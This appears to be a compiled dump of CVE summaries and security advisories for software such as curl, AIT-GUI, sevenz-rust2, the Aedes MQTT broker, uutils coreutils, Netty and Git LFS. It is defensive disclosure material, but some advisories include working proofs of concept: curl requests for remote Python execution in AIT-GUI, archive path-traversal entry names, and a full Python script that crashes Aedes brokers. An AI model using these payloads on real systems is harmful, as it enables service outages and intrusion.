cves.summary: Format string vulnerability in Pablo FTP Server 1.5, 1.3, and possibly other versions, allows remote attackers to cause a denial of service and possibly execute arbitrary code via format strings in the USER command.

Maped in LuxMan 0.41 uses the user-provided search path to find and execute the gzip program, which allows local users to modify /dev/mem and gain privileges via a modified PATH environment variable that points to a Trojan horse gzip program.
Northern Solutions Xeneo Web Server 2.1.0.0, 2.0.759.6, and other versions before 2.1.5 allows remote attackers to cause a denial of service (crash) via a GET request for a "%" URI.
Buffer overflow in Abuse 2.00 and earlier allows local users to gain root privileges via a long -net command line argument.
Buffer overflow in log2mail before 0.2.5.1 allows remote attackers to execute arbitrary code via a long log message.
A buffer overflow in InterScan VirusWall 3.23 and 3.3 allows a remote attacker to execute arbitrary code by sending a long HELO command to the server.
Buffer overflow in NFS server on Linux allows attackers to execute commands via a long pathname.
Whois Internic Lookup program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
Matt's Whois program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
CC Whois program whois.cgi allows remote attackers to execute commands via shell metacharacters in the domain entry.
fsr_efs in IRIX 6.5 allows local users to conduct unauthorized file activities via a symlink attack, possibly via the .fsrlast file.
mv in IRIX 6.5 creates a directory with world-writable permissions while moving a directory, which could allow local users to modify files and directories.

restore 0.4b15 and earlier in Red Hat Linux 6.2 trusts the pathname specified by the RSH environmental variable, which allows local users to obtain root privileges by modifying the RSH variable to point to a Trojan horse program.

Winamp 2.65 through 3.0 stores skin files in a predictable file location, which allows remote attackers to execute arbitrary code via a URL reference to (1) wsz and (2) wal files that contain embedded code.
Local or remote users can force ControlIT 4.5 to reboot or force a user to log out, resulting in a denial of service.
Remote attackers can cause a denial of service in Sendmail 8.8.x and 8.9.2 by sending messages with a large number of headers.
IIS 4.0 and Apache log HTTP request methods, regardless of how long they are, allowing a remote attacker to hide the URL they really request.

Microsoft Internet Explorer 5.01, 5.5 and 6.0 does not properly check parameters that are passed during third party rendering, which could allow remote attackers to execute arbitrary web script, aka the "Third Party Plugin Rendering" vulnerability, a different vulnerability than CVE-2003-0233.
Buffer overflow in the web administration service for the HiNet LP5100 IP-phone allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long GET request.
The NSAPI plugins for TGA and the Java Servlet proxy in HP-UX VVOS 10.24 and 11.04 allows an attacker to cause a denial of service (high CPU utilization).

Cross-site scripting (XSS) vulnerability in Falcon web server 2.0.0.1009 through 2.0.0.1021 allows remote attackers to inject arbitrary web script or HTML via the URI, which is inserted into 301 error messages and executed by 404 error messages.

Static code injection vulnerability in users.php in MySimpleNews allows remote attackers to inject arbitrary PHP code and HTML via the (1) LOGIN, (2) DATA, and (3) MESS parameters, which are inserted into news.php3.
MySimpleNews 1.0 allows remote attackers to delete arbitrary email messages via a direct request to vider.php3.
Cross-site scripting (XSS) vulnerability in (1) showcat.php and (2) addyoursite.php in phpLinkat 0.1.0 allows remote attackers to inject arbitrary web script or HTML via the catid parameter.

By permanently omitting the final control-response line, a malicious FTP,
IMAP, POP3, or SMTP server can exploit libcurl and completely bypass its
configured transfer timeout mechanism, indefinitely blocking all concurrent
transfers bound to the same multi-handle.

When writing a long cookie name and value to a Netscape cookie jar, a remote
HTTP server can make `curl` write a record that exceeds its line-length
parsing limit. Consequently, any subsequent `curl` invocation reading from
that same cookie jar using `--cookie` silently aborts parsing prematurely upon
encountering the too long line, ignoring all subsequent valid cookies in the
file.

When built with wolfSSL, curl can successfully validate a pinned public key
hash against a key the TLS peer does not possess. During the TLS handshake,
wolfSSL validates the connection, but curl's subsequent re-parsing of the same
certificate - tricked by a manipulated validity length field - extracts and
matches a different embedded key, incorrectly authorizing the pinned public
key.

A remote HTTP server can set a cookie that curl accepts and writes to a
Netscape cookie jar but cannot reload. On the next invocation using the same
path for `--cookie` and `--cookie-jar`, curl fails before connecting, then the
cleanup procedure replaces the jar with an empty file, deleting cookies for
unrelated domains.

An `ftp://` transfer configured with `CURLUSESSL_NONE` can reuse a pooled FTP
control connection that a previous easy handle upgraded with `STARTTLS` and
authenticated using a client certificate. The second handle performs neither a
new TLS handshake nor a new FTP login, so the server continues to authorize it
under the first handle's certificate identity.

** UNSUPPORTED WHEN ASSIGNED ** Improper neutralization of special elements used in an SQL command ('SQL injection') vulnerability in Apache Cocoon.

This issue affects Apache Cocoon: all versions.

Missing input sanitation would allow arbitrary SQL injection through the SQL processor or sql:/esql: logicsheets.

As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.

NOTE: This vulnerability only affects products that are no longer supported by the maintainer.

Multiple buffer overflows in Novell iChain 2.1 before Field Patch 3, and iChain 2.2 before Field Patch 1a, allow attackers to cause a denial of service (ABEND) and possibly execute arbitrary code via (1) a long user name or (2) an unknown attack related to a "special script against login."
Unknown vulnerability in Novell iChain 2.2 before Support Pack 1 allows users to access restricted or secure pages without authentication.
Posadis 0.50.4 through 0.50.8 allows remote attackers to cause a denial of service (crash) via a DNS message without a question section, which triggers null dereference.

A flaw was found in cockpit-files. A local unprivileged attacker can exploit a race condition during directory creation with owner assignment. By controlling a writable parent directory, the attacker can replace a newly created directory with a symbolic link (symlink) before the ownership change operation (chown) is applied. This allows the attacker to redirect the ownership change to an arbitrary file, potentially leading to information disclosure or unauthorized modification of sensitive files.

A flaw was found in cockpit-files. This vulnerability allows a local attacker to exploit a timing issue, known as a symlink race condition, during privileged file operations such as changing file ownership or permissions. By manipulating directory entries and winning this race, the attacker can redirect these operations to unintended files. This could lead to unauthorized changes in file ownership and permissions on arbitrary files, potentially compromising system integrity and availability by altering system or application states or rendering services unusable.

Concurrent surfacing RPC failures can trigger more than one reconnect for the same dirty session, and cancellation during a post-reconnect retry can leave the replacement session reusable despite an interrupted protocol exchange. The private fix introduces monotonic session generations, one shielded shared reconnect flight per dirty generation, and generation-aware cancellation handling across search, access-count, and scratch RPCs. The duplicate-reconnect subcase was introduced in 0.1.24; cancellation recovery affects the broader listed range.

cves.summary: Untrusted long-term and working-memory fields can introduce Markdown or HTML-compatible structure into the surfaced-memory envelope. A crafted memory may create misleading structural boundaries or visually conceal content. The private fix serializes every untrusted field as inert single-line data, validates copyable memory identifiers, and pins an explicit untrusted-data preamble. Ordinary natural-language persuasion remains a residual model-level risk.

cves.summary:
## Summary
A security issue exists where unauthenticated callers can instruct the AIT-GUI server to execute arbitrary Python scripts. The attack vector involves obtaining a session cookie through GET /, followed by a malicious POST /script/run request containing an absolute file path that bypasses the configured script directory restrictions.

### Patches
* 2.5.1

### Impact
This vulnerability allows unauthenticated remote code execution on the AIT-GUI server. Any attacker with network access can execute arbitrary Python code with daemon privileges.

## Details
_Chain:_
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.
2. `POST /script/run` accepts `scriptPath=../static/fields_in.txt`.
   * AIT-GUI reads that file and runs it as Python.

_Relevant code:_
- `ait/gui/__init__.py:930,935,942-944`: `/tlm/query` writes `fields` to `fields_in.txt`.
- `ait/gui/__init__.py:952-958,978`: the no-PCAP error path aborts before cleanup.
- `ait/gui/__init__.py:1130-1136`: `/script/run` joins `scriptPath` with `ScriptRoot` and only checks that the path exists.
- `ait/gui/__init__.py:1186-1191`: the selected file is read and executed as Python.
- `ait/gui/__init__.py:1105-1108`: nearby `/scripts/load/<name>` has a path containment check, but `/script/run` does not.

### Fix Information
Restricted script execution paths and avoided using static temp files.

## PoC
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.
```
# Remove file to ensure nothing exists
AIT-GUI % rm <path>/fields_in.txt

# With server started, send POST request to /tlm/query endpoint
AIT-GUI % curl -X POST http://localhost:8080/tlm/query \  -d "dataDir=<path>" \     
  -d "timeField=time" \
  -d "packet=CCSDS_HEADER" \
  -d "fields=field1,field2,field3" \
  -d "startTime=2026-07-01T00:00:00" \
  -d "endTime=2026-07-10T00:00:00" \
  -o query_out.csv
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   925  100   782  100   143  34798   6363 --:--:-- --:--:-- --:--:-- 42045

# AIT-server log verify that PCAP file cannot be found:
2026-07-10T11:46:37.873 | ERROR    | Unable to locate PCAP files for query given data directory <path>

# Verify file is created and not cleaned up
AIT-GUI % cat <path>/fields_in.txt
field1
field2
field3
```
2. `POST /script/run` accepts `scriptPath=../static/fields_in.txt`.
   * AIT-GUI reads that file and runs it as Python.

```
# Generate session cookie
curl -c cookies.txt -v http://localhost:8080/ -o /dev/null

# Execute example script which currently exists in configured scripts.directory in config.yaml
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % cat config.yaml | grep script
    script:
        directory: ./scripts

(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % ls scripts
example_script.py

# Create exploit script "exploit.py" outside of configured location
(venv) scripts % ls ../exploit.py 
../exploit.py

# Perform request to example_script.py. This script prints 'correct'
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=example_script.py" -b cookies.txt

# Perform request to exploit.py, which exists outside of configured location. This script prints 'exploited'
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=../exploit.py" -b cookies.txt  

# Verify in server logs that correct and exploit print
2026-07-10T13:46:41.441 | INFO     | Starting broker...
correct
...
exploited

```

## Additional Notes

- Python code execution in the AIT-GUI server process.
- The demo is localhost only (`127.0.0.1`) and proves the issue against AIT-GUI `2.5.0`. 
- The tested AIT-GUI source binds the web server to `0.0.0.0`, so in a deployment where another host can reach the AIT-GUI HTTP port, this becomes code execution from that network position.
- No login credentials or privileged account were required in the tested flow. The PoC only used the normal `sid` cookie created by `GET /`. In my local demo, the payload ran as my normal user (`uid=1000`), not root.
- [ait_gui_tlm_query_script_run_rce_live_server.py](https://github.com/user-attachments/files/29583858/ait_gui_tlm_query_script_run_rce_live_server.py)
- [ait-gui-tlm-query-script-run-rce.patch](https://github.com/user-attachments/files/29583552/ait-gui-tlm-query-script-run-rce.patch)
- https://github.com/user-attachments/assets/a188aaa3-783a-4bb0-ab9a-6541f939a26a

cves.summary:
### Summary

Extracting an attacker-supplied 7z archive can write files outside the destination directory. The 7z header stores each entry's path as a UTF-16 name with nothing constraining it to a relative, in-tree path. The extractor joins that name onto the destination and writes to the result without normalizing it or checking that it stays under the destination root, so an entry named `../../etc/cron.d/x` or an absolute path escapes the target.

### Details

In `src/util/decompress.rs`, `decompress_impl` computes the per-entry destination directly (line 140):

```rust
let dest_path = dest.join(entry.name());
extract_fn(entry, reader, &dest_path)
```

`default_entry_extract_fn` (line 154) then acts on that path:

```rust
let file = File::create(path)
    .map_err(|e| Error::file_open(e, path.to_string_lossy().to_string()))?;
```

There is no normalization, no `dest_path.starts_with(dest)` check, and no symlink-entry handling. `Path::join` discards the base when the joined component is absolute, and `..` components are not collapsed against the base. The convenience entry points (`decompress`, `decompress_file`, `decompress_with_password`, `decompress_file_with_password`) all route through `decompress_impl` with `default_entry_extract_fn`, so the default API is affected.

The trust boundary is the archive bytes. Any caller that extracts an untrusted `.7z` reaches the sink.

### PoC

1. Build a `.7z` whose `FilesInfo` contains an entry named `../../../../tmp/pwned` (or, on Windows, an absolute path such as `C:\Windows\Temp\pwned`).
2. Call `sevenz_rust2::decompress_file("evil.7z", "./out")`.
3. The file is created at the traversed location outside `./out`. Targeting a startup/cron path or a config file turns the write into code execution or persistence.

### Impact

Arbitrary file write outside the intended directory (CWE-22 / CWE-23, the Zip-Slip class). On extraction of an attacker-controlled archive, an entry overwrites files outside the destination — config, cron, autostart, or build artifacts — which can escalate to code execution. Reachable by upload-handling backends, malware-analysis sandboxes, mod/game installers, and CI steps that unpack user-supplied 7z files.

### Suggested remediation

Reject any entry whose name contains a `ParentDir`, `RootDir`, or `Prefix` component, or canonicalize the joined path and verify `starts_with(dest)` before creating it. Apply the guard inside `default_entry_extract_fn` (and `decompress_impl`) so the hardening is the default rather than left to each caller. Reject or explicitly opt-in symlink entries.

## Maintainer response

This issue was patched with ef760b61f3535ac8b93006212aef41bfebc237eb and released as `v0.21.1` to crates.io

Consumers that extract attacker-supplied archives received over a network without user interaction should re-score as AV:N/UI:N (≈8.6).

cves.summary:
### Summary
A remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.

### Details
The Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.

This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.

This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.

Stack Trace from Crash:
```Plaintext
aedes-broker  | /app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604
aedes-broker  | 	throw new Error('too many words');
aedes-broker  | 	^
aedes-broker  | 
aedes-broker  | Error: too many words
aedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)
aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)
aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)
aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)
aedes-broker  |     at Aedes.subscribe (/app/node_modules/aedes/aedes.js:289:11)
aedes-broker  |     at SubState.addSubs (/app/node_modules/aedes/lib/handlers/subscribe.js:167:12)
```
The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.

### PoC
**Prerequisites**
+ Aedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:
```bash
docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latest
```
+ Ability to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).

**Reproduction Steps**

1. Save the following Python stress testing script (mqtt_crash_poc.py):
```Python
#!/usr/bin/env python3
import argparse
import time
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[-] Error en la conexión: {reason_code}")

def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[*] -> Desconexión detectada (Caída del bróker). Razón: {reason_code}")

def run_exploit(host, port):
    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)
    payloads = [
            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},
            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},
            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},
            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}
    ]
        
    for case in payloads:
        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
            
        try:
            client.connect(host, port, keepalive=60)
            client.loop_start()
            time.sleep(1)
                
            if "PUB" in case['type']:
                client.publish(case['topic'], payload="DoS_Attack", qos=0)
            else:
                client.subscribe(case['topic'], qos=0)
                time.sleep(1)
                client.publish(case['pub'], payload="DoS_Attack", qos=0)
                    
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error durante el envío: {e}")
        finally:
            client.loop_stop()
            client.disconnect()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")
    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")
    args = parser.parse_args()
    run_exploit(args.direccion, args.puerto)
```

2. Run the script against the target broker:python3 mqtt_crash_poc.py -d <BROKER_IP> -p 1883
3. Upon execution, the Aedes broker dies instantly on the very first packet (PUB_DEEP). Checking the container logs will reveal the stack trace provided in the Details section, confirming the Error: too many words exception.

### Impact
This is a Remote Denial of Service (DoS) vulnerability. It affects any infrastructure running an unpatched Aedes MQTT Broker. A successful attack terminates the service entirely, disconnecting all legitimate clients (IoT devices, applications, users) and preventing reconnection until the process is manually or automatically restarted, causing severe business and operational interruption.

### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports leafnode connections between servers and message tracing through NATS headers.

### Problem Description

Message trace destination checks were applied to ordinary client connections but not consistently to messages arriving through leafnode connections.

A leafnode operator could cause trace events to be sent to subjects that would not otherwise be permitted and could use trace-only behavior to prevent normal delivery or storage of affected messages.

Trace events can include routing, subscription, account, service import and JetStream metadata. The payload of the original application message is not chosen through the trace event itself.

### Affected Versions

Versions v2.14.2, v2.12.7 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.8.

### Workarounds

Where possible, avoid granting publish paths from less-trusted leaf nodes into subjects for which trace-only behavior would affect delivery guarantees. No other known workarounds are available aside from upgrading to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p3j5-5hrq-p75h>
 * Credit: Koda Reef

`chcon` resolved recursive targets from `fts_accpath` with a fresh path lookup, so traversal and the SELinux get/set were not bound to traversal directory state. A privileged recursive relabel can be redirected to unintended objects under rename/symlink races. Fix opens targets with `openat` against the traversal cwd fd before the SELinux operation.

**Fixed in 0.10.0** (PR #12566, commit 7cfc74e47ffab452663be6842d788a5164d9688b): recursive relabel resolution is anchored to the traversal dirfd.

_Zellic private finding (zellic-ext/coreutils-private PR #120). Reported in the Zellic *uutils coreutils Program Security Assessment* (for Canonical, Jan 2026), audited commit `3a07ffc5a9bd4c283e75afa548ba1f1957bad242`._

cves.summary:
In `env -S`, GNU keeps backslashes literal inside single quotes (except `\\` and `\'`); uutils errors on sequences like `\a`. This is the backslash-handling issue of the broader `-S`/`--split-string` parsing divergence.
```
env -S"printf %s '\''\\x'\''"   # GNU prints \x ; uutils: invalid sequence '\x' in -S (125)
```

_Zellic private finding (zellic-ext/coreutils-private PR #117). Reported in the Zellic *uutils coreutils Program Security Assessment* (for Canonical, Jan 2026), audited commit `3a07ffc5a9bd4c283e75afa548ba1f1957bad242`._

`split` checks input/output identity by path before opening the output, then opens with truncation, leaving a race window on mutable path components. GNU opens first and compares the opened output inode against the input before truncating. The race can cause `split` to truncate/write a file different from the one validated — including the input file or another file the process can access.

**Fixed in 0.10.0** (PR #12565, commit 58040feb5c66fce588a7ffac299b3a23bd55cd81): the output open path is hardened against TOCTOU target swaps.

_Zellic private finding (zellic-ext/coreutils-private PR #119). Reported in the Zellic *uutils coreutils Program Security Assessment* (for Canonical, Jan 2026), audited commit `3a07ffc5a9bd4c283e75afa548ba1f1957bad242`._

cves.summary:
## Description

Web user registration form is vulnerable to session fixation if the site is configured with server-side session storage (CKAN uses cookie-based session storage by default). The attacker would need to either set a cookie on the victim's browser or steal the victim's currently valid session. Session identifiers are now regenerated after registration.

## Patches

This vulnerability has been fixed in CKAN 2.10.11, 2.11.6 and 2.12.0

## Workarounds

switch to cookie-based session storage (the default) or disable web user registration by setting `ckan.auth.create_user_via_web` to false (the default)

## Summary:

OHttpClientCodec and OHttpServerCodec retain the encrypted outer HttpContent in a handler-level cumulationBuffer. After a valid OHTTP exchange completes, the OHTTP request/response context is destroyed, but the outer cumulationBuffer is not released or reset. It remains referenced by the codec until a later inbound content frame replaces it or the handler is removed/channel is closed.

This can pin attacker-influenced pooled/direct buffer capacity on idle keep-alive channels. Across many long-lived idle connections, this can create availability pressure.

Affected components:

* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpClientCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpServerCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpRequestResponseContext.java

## Root cause:

OHttpClientCodec retains inbound content into a handler-level cumulationBuffer. On LastHttpContent, it destroys only the OHttpRequestResponseContextHolder. The cumulationBuffer is released in handlerRemoved(), not immediately after successful exchange completion.

OHttpServerCodec follows the same pattern: it retains inbound content into a handler-level cumulationBuffer, and on completed request/response it destroys the OHttpRequestResponseContext. The outer cumulationBuffer remains owned by the codec and is released only when the handler is removed.

OHttpRequestResponseContext.parse() consumes bytes from the caller-provided outer cumulation buffer, but its destroy() path releases only the inner binary HTTP cumulation, not the codec-level outer cumulationBuffer.

## PoC:

A local test only:

```
codec-ohttp/src/test/java/io/netty/incubator/codec/ohttp/OHttpCumulationBufferRetentionTest.java
```

The test reuses existing OHTTP test helpers and BouncyCastle crypto provider to perform valid completed OHTTP exchanges over EmbeddedChannel pairs. It sends both a small and a large request/response exchange, confirms completion, then reflects the private cumulationBuffer field from both OHttpClientCodec and OHttpServerCodec.

Command:

```
./mvnw -pl codec-ohttp -Dtest=OHttpCumulationBufferRetentionTest -DfailIfNoTests=false test
```

Observed output:

```
small client after completion: refCnt=1 capacity=1064 readerIndex=1064 writerIndex=1064 readableBytes=0
small server after completion: refCnt=1 capacity=1110 readerIndex=1110 writerIndex=1110 readableBytes=0
large client after completion: refCnt=1 capacity=262144 readerIndex=131114 writerIndex=131114 readableBytes=0
large server after completion: refCnt=1 capacity=262144 readerIndex=131160 writerIndex=131160 readableBytes=0
small after close: clientOldRefCnt=0 serverOldRefCnt=0
large after close: clientOldRefCnt=0 serverOldRefCnt=0
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

Interpretation:

After completion, both the client and server cumulationBuffer objects have:

* refCnt=1
* readableBytes=0
* large retained capacity for the large exchange
* channel still open/active
* OHTTP context completed/destroyed

After channel close/handler removal, the previously retained buffers are released and their old refCnt values become 0.

## Impact:

A peer can complete a large valid OHTTP request/response and keep the connection open. The codec retains the high-water outer cumulation buffer for the lifetime of the idle keep-alive channel, or until a later inbound content frame replaces it. Across many idle keep-alive channels, this can pin pooled/direct memory and create availability pressure.

This is not unbounded growth per exchange on a single channel. The more precise impact is connection-lifetime retention of the current consumed high-water outer cumulation buffer.

## Suggested fix:

After successful LastHttpContent processing, release and reset the codec-level outer cumulationBuffer once parsing has consumed the complete message and no unread bytes remain.

Care is needed not to release the buffer if unread bytes remain for pipelined data. A safe fix would release/reset the outer cumulationBuffer in the completed-exchange path only when the parse consumed the full outer body.

## Test environment:

* WSL Ubuntu
* Java 11
* Current main branch / 0.0.24.Final-SNAPSHOT
* PoC test used BouncyCastleOHttpCryptoProvider and existing OHttpCodecsTest helpers

Affected version testing:

The issue was reproduced on the following release tags:

* netty-incubator-codec-parent-ohttp-0.0.20.Final
* netty-incubator-codec-parent-ohttp-0.0.21.Final
* netty-incubator-codec-parent-ohttp-0.0.22.Final
* netty-incubator-codec-parent-ohttp-0.0.23.Final

It was also reproduced on main / 0.0.24.Final-SNAPSHOT.

For 0.0.20.Final through 0.0.23.Final, the PoC output consistently showed:

* large client after completion: refCnt=1 capacity=262144 ... readableBytes=0
* large server after completion: refCnt=1 capacity=262144 ... readableBytes=0
* large after close: clientOldRefCnt=0 serverOldRefCnt=0
* BUILD SUCCESS

This confirms that completed exchanges leave the consumed outer cumulation buffer retained until channel/handler close in these versions.

cves.summary:
### Impact

When fetching objects from a malicious repository, Git LFS may execute an arbitrary command or binary after failing to sufficiently restrict the set of configuration options defined in an `.lfsconfig` file in the repository.

Git LFS permits a limited set of configuration options to be defined in an `.lfsconfig` file at the root of a Git repository, but does not filter these options correctly if their keys contain certain additional components, which allows an attacker to mimic options that configure Git LFS to use a custom command to transfer objects.  An attacker can then provide an arbitrary command which Git LFS will invoke when fetching objects.

Git LFS has resolved this issue by correctly restricting the configuration of custom object transfer commands to local Git configuration files.

### Patches

This problem exists in all versions since 1.3.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

No single workaround exists other than to disable Git LFS entirely. As far as possible, users and administrators should avoid cloning repositories from untrusted sources.

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).
* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).

### Impact

When fetching objects from a malicious repository, Git LFS may execute an arbitrary command or binary after incorrectly parsing the Git configuration options defined for a submodule.

Git LFS reads Git configuration options without checking for embedded line-ending control characters.  By inserting control characters such as line feed (LF) into certain values, an attacker may be able to mimic options that cause Git LFS to execute an arbitrary command when fetching or adding objects.

Git LFS has resolved this issue by always using an unambiguous format to read and parse Git configuration options.

### Patches

This problem exists in all versions since 0.6.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

To work around the problem, users should prevent Git from initializing any submodules by disabling the `fetch.recurseSubmodules` and `submodule.recurse` configuration options and by never running the `git submodule init` command.  Any submodules which have already been initialized in a repository may be deactivated with the `git submodule deinit` command.

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).
* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).
